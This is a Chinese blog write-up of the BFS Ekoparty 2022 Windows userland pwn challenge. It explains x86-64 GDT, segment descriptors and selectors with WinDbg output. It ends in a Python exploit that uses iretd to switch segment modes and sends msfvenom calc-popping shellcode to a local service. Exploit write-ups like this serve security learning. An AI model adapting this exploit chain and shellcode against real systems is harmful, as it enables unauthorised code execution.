+<p>但是在保护模式下段寄存器依然是16位，但是意义大不一样。参考：<a target="_blank" rel="noopener" href="https://utopianfuture.github.io/X86/Segment-data-structure.html">段式管理的数据结构</a></p>
+<p>GDTR保存GDT的相关信息，也就是GDT表的起始地址和大小</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> limit;    <span class="comment">// GDT 最大长度</span></span><br><span class="line">    <span class="type">uint64_t</span> base;     <span class="comment">// GDT 基地址，在x86下是 uint32_t</span></span><br><span class="line">&#125; GDTR;</span><br></pre></td></tr></table></figure>
+
+<p>GDT表中的内容：段描述符，记录段的信息</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> limit_low;         <span class="comment">// 段限界 0-15 bits (Segment Limit)</span></span><br><span class="line">    <span class="type">uint16_t</span> base_low;          <span class="comment">// 基地址 0-15 bits (Base Address)</span></span><br><span class="line">    <span class="type">uint8_t</span>  base_mid;          <span class="comment">// 基地址 16-23 bits (Base Address)</span></span><br><span class="line">    <span class="type">uint8_t</span>  type : <span class="number">4</span>;          <span class="comment">// 段类型 (Segment Type)</span></span><br><span class="line">    <span class="type">uint8_t</span>  s : <span class="number">1</span>;             <span class="comment">// 描述符类型 (Descriptor Type, 0=system, 1=code or data)</span></span><br><span class="line">    <span class="type">uint8_t</span>  dpl : <span class="number">2</span>;           <span class="comment">// 描述符特权级别 (Descriptor Privilege Level)</span></span><br><span class="line">    <span class="type">uint8_t</span>  p : <span class="number">1</span>;             <span class="comment">// 段存在位 (Segment Present)</span></span><br><span class="line">    <span class="type">uint8_t</span>  limit_high : <span class="number">4</span>;    <span class="comment">// 段限界 16-19 bits (Segment Limit)</span></span><br><span class="line">    <span class="type">uint8_t</span>  avl : <span class="number">1</span>;           <span class="comment">// 可用位 (Available for use by system software)</span></span><br><span class="line">    <span class="type">uint8_t</span>  l : <span class="number">1</span>;             <span class="comment">// 64-bit code segment (0 for non-64-bit code segments)</span></span><br><span class="line">    <span class="type">uint8_t</span>  db : <span class="number">1</span>;            <span class="comment">// 默认操作大小 (Default Operation Size, 0=16-bit, 1=32-bit)</span></span><br><span class="line">    <span class="type">uint8_t</span>  g : <span class="number">1</span>;             <span class="comment">// 粒度 (Granularity, 0=byte, 1=4KB)</span></span><br><span class="line">    <span class="type">uint8_t</span>  base_high;         <span class="comment">// 基地址 24-31 bits (Base Address)</span></span><br><span class="line">&#125; SegmentDescriptor;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Base <span class="number">31</span>:<span class="number">24</span>  | G | D/B | L | AVL | Limit <span class="number">19</span>:<span class="number">16</span> | P | DPL | S  | Type | Base <span class="number">23</span>:<span class="number">16</span> |  Base <span class="number">15</span>:<span class="number">0</span>  | Limit <span class="number">15</span>:<span class="number">0</span> |</span><br><span class="line">-------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>段寄存器保存16位宽的段选择符segment selector</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 段选择器结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> rpl  : <span class="number">2</span>;  <span class="comment">// 请求特权级别 (Request Privilege Level)</span></span><br><span class="line">    <span class="type">uint16_t</span> ti   : <span class="number">1</span>;  <span class="comment">// 描述符表指示器 (Table Indicator, 0 for GDT, 1 for LDT)</span></span><br><span class="line">    <span class="type">uint16_t</span> index: <span class="number">13</span>; <span class="comment">// 描述符表索引 (Descriptor Table Index)</span></span><br><span class="line">&#125; SegmentSelector;</span><br></pre></td></tr></table></figure>
+
+<p>cs,ss的值代表描述符在 LDT&#x2F;GDT 中的偏移。</p>
+<ul>
+<li>TI &#x3D; 0 使用GDT</li>
+<li>TI &#x3D; 1 使用LDT</li>
+</ul>
+<p>并且在 amd64 cpu下，段寄存器相对固定<br>- 0x00: 恒为0</p>
+<ul>
+<li><strong>内核模式</strong>：<ul>
+<li><code>CS</code>寄存器的值为<code>0x10</code>，对应于GDT中的<code>KERNEL_CODE_SELECTOR</code>。</li>
+<li><code>SS</code> 为 <code>0x18</code></li>
+</ul>
+</li>
+<li><strong>用户模式</strong>：<ul>
+<li><code>CS</code>寄存器的值为<code>0x33</code>，对应于GDT中的<code>USER_CODE_SELECTOR</code>，并设置RPL（请求特权级）为3。</li>
+<li><code>SS</code> 为 0x28</li>
+</ul>
+</li>
+</ul>
+<p>我们得到基址就可以获得 <code>cs:ip 的值</code></p>
+<p>使用IDA调试发生错误，使用WinDbgX调试</p>
+<p>观察rsp</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq @rsp</span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e8d0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e8e0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e8f0  <span class="number">00000f</span>02`<span class="number">00001000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e900  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e910  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e920  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e930  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br><span class="line"><span class="number">00000000</span>`<span class="number">012f</span>e940  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">61616161</span>`<span class="number">61616161</span></span><br></pre></td></tr></table></figure>
+
+<p>因此我们先让此函数执行6次 <code>pop rax</code>，在执行<code>iretd</code>（WinDbgX显示） 从而控制ss等寄存器。</p>
+<p>我们程序原本的ss</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r ss</span><br><span class="line">ss=<span class="number">002</span>b</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; r cs</span><br><span class="line">cs=<span class="number">0033</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就是比较难的点，需要我们知道 x86_64下，iretd 需要pop的是x86的cs和ss。也就是寻找一个 <code>SegmentDescriptor.l = 0</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dg [selector [number]]</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; r gdtr</span><br><span class="line">gdtr=fffff8027bb59fb0</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dg <span class="number">0x23</span></span><br><span class="line">                                                    P Si Gr Pr Lo</span><br><span class="line">Sel        Base              Limit          Type    l ze an es ng Flags</span><br><span class="line">---- ----------------- ----------------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0020</span> <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`ffffffff Code RE Ac <span class="number">3</span> Bg Pg P  Nl <span class="number">00000</span>cfb</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq fffff8027bb59fb0+<span class="number">0x20</span></span><br><span class="line">fffff802`<span class="number">7b</span>b59fd0  <span class="number">00</span>cffb00`<span class="number">0000f</span>fff <span class="number">00</span>cff300`<span class="number">0000f</span>fff</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; .formats <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line">  Decimal: <span class="number">58541297597743103</span></span><br><span class="line">  <span class="built_in">Decimal</span> (<span class="type">unsigned</span>) : <span class="number">58541297597743103</span></span><br><span class="line">  Octal:   <span class="number">0003177660000000177777</span></span><br><span class="line">  Binary:  <span class="number">00000000</span> <span class="number">11001111</span> <span class="number">11111011</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">11111111</span> <span class="number">11111111</span></span><br><span class="line">  Chars:   ........</span><br><span class="line">  Time:    Thu Jul  <span class="number">6</span> <span class="number">11</span>:<span class="number">09</span>:<span class="number">19.774</span> <span class="number">1786</span> (UTC + <span class="number">8</span>:<span class="number">00</span>)</span><br><span class="line">  Float:   low <span class="number">9.18341e-041</span> high <span class="number">1.91e-038</span></span><br><span class="line">  Double:  <span class="number">9.10834e-305</span></span><br></pre></td></tr></table></figure>
+
+<p>观察 <code>l</code> 位为0，代表为32位。同理找到 <code>0x53</code> data segment</p>
+<p>eflags可以直接调试得出，可以不改变</p>
+<p>iretd 会转化一次架构位为x86架构，我们生成的shellcode为x64，再次转化架构也就是 <code>jmp cs:ip</code> 执行再次转化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p64</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p16</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;H&quot;</span>, v)</span><br><span class="line"></span><br><span class="line"><span class="comment"># addr = &quot;192.168.85.128&quot;</span></span><br><span class="line">addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">31415</span></span><br><span class="line"></span><br><span class="line">conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">conn.connect((addr, port))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> conn:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Error connect&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;Hello\x00&quot;</span></span><br><span class="line">conn.send(payload)</span><br><span class="line"><span class="built_in">print</span>(conn.recv(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">RIP|CS|RFLAGS|SP|SS</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ctx = p32(<span class="number">0x10000014</span>) + p32(<span class="number">0x23</span>) + p32(<span class="number">0x202</span>) + p32(<span class="number">0x10000000</span>) + p32(<span class="number">0x53</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># msfvenom -a x64 --platform Windows -p windows/x64/exec cmd=&quot;calc&quot; -f python -v shellcode</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xda\xff\xd5\x63\x61\x6c\x63\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&quot;JMP 0x33:0x1000001c&quot;)</span></span><br><span class="line"><span class="string">b&#x27;\xea\x1c\x00\x00\x103\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">jmp_shellcode = <span class="string">b&#x27;\xea\x1c\x00\x00\x103\x00&#x27;</span> <span class="comment"># JMP 0x33:0x1000001c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&quot;mov rsp, rcx&quot;)</span></span><br><span class="line"><span class="string">b&#x27;H\x89\xcc&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">origin_rsp = <span class="string">b&#x27;H\x89\xcc&#x27;</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;\x90&quot;</span> * <span class="number">7</span></span><br><span class="line">header = p64(<span class="number">0x323230326F6B45</span>)</span><br><span class="line">header += <span class="string">b&quot;T&quot;</span></span><br><span class="line">header += p16(<span class="number">0x8000</span>)</span><br><span class="line">data = ctx</span><br><span class="line">data += jmp_shellcode + origin_rsp</span><br><span class="line">data += shellcode</span><br><span class="line">data += <span class="string">b&quot;\x90&quot;</span> * (<span class="number">0xF00</span> - <span class="built_in">len</span>(data))</span><br><span class="line">data += <span class="string">b&quot;X&quot;</span> + padding</span><br><span class="line">conn.send(header + data)</span><br></pre></td></tr></table></figure>
+
+<p>第一次接触到段寄存器这种玩法，狠狠的学习了😤</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://infosecwriteups.com/bfs-ekoparty-2022-exploitation-challenges-7deffce64ee4">BFS Ekoparty 2022 Exploitation Challenges</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#eko"><span class="toc-number">1.</span> <span class="toc-text">eko</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&text=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&is_video=false&description=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BFS-Ekoparty2022-windows-pwn&body=Check out this article: https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&title=BFS-Ekoparty2022-windows-pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/08/04/BFS-Ekoparty2022-windows-pwn/&name=BFS-Ekoparty2022-windows-pwn&description=&lt;blockquote&gt;
+&lt;p&gt;Windows userland PWN&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下&lt;/p&gt;
+&lt;p&gt;网址：&lt;a href=&#34;https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/&#34;&gt;BFS Ekoparty 2022 Exploitation Challenges&lt;/a&gt;真好，还能直接发offer😭&lt;/p&gt;
+&lt;h2 id=&#34;eko&#34;&gt;&lt;a href=&#34;#eko&#34; class=&#34;headerlink&#34; title=&#34;eko&#34;&gt;&lt;/a&gt;eko&lt;/h2&gt;&lt;p&gt;弹出计算机就算成功，不能使用额外的库。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在本机win11 24h2进行调试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;winchecksec&lt;/p&gt;
+&lt;figure class=&#34;highlight pwsh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bfs&lt;span class=&#34;literal&#34;&gt;-eko2022&lt;/span&gt; ❯ winchecksec .\bfs&lt;span class=&#34;literal&#34;&gt;-eko2022&lt;/span&gt;.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Warn: No load config &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; the PE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Results &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;: .\bfs&lt;span class=&#34;literal&#34;&gt;-eko2022&lt;/span&gt;.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Dynamic Base    : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ASLR            : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;High Entropy VA : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Force Integrity : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Isolation       : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX              : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SEH             : &lt;span class=&#34;string&#34;&gt;&amp;quot;Present&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CFG             : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RFG             : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SafeSEH         : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotApplicable&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GS              : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Authenticode    : &lt;span class=&#34;string&#34;&gt;&amp;quot;NotPresent&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.NET            : &lt;span 